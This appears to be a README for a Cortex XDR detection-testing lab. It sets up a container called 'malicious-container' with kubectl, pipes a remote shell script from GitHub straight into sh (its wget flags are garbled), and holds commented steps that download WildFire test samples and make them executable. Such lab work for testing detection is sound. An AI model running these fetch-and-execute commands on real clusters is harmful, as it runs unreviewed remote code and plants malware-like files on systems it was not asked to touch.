# Cortex XDR Malicous Container

## Malicous Containers
* 


## Working Tasks 

[X] test malicous contaienr script 
[X] Create dockerfile image 
[X] build container locally 
[X] test image locally 



## Dockerhub 



## Kubectl Quick Deployments 

kubectl run malicious-container --image=alpine --restart=Never -- /bin/sh -c "while true; do sleep 30; done"

kubectl exec -it malicious-container -- /bin/sh -c "wget https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/1.0/malicous-container/malicous-container.sh- qO-  | sh"



# SENARIO -- WILDFIRE LOCAL ANALYSIS 
# Step 2: Download Sample Files from WildFire for Testing Purposes
# echo "[+] Downloading WildFire test samples..."
# for sample in pe apk macos elf; do
#  if command -v wget >/dev/null 2>&1; then
#    wget https://wildfire.paloaltonetworks.com/publicapi/test/${sample} -O $DOWNLOAD_DIR/${sample}_sample
#  elif command -v curl >/dev/null 2>&1; then
#    curl -o $DOWNLOAD_DIR/${sample}_sample https://wildfire.paloaltonetworks.com/publicapi/test/${sample}
#  fi;
#sleep 7 

# Step 3: Make the Downloaded Samples Executable
#echo "[+] Making the downloaded samples executable..."
#chmod +x $DOWNLOAD_DIR/*_sample

# SENARIO --- LINUX MALWARE 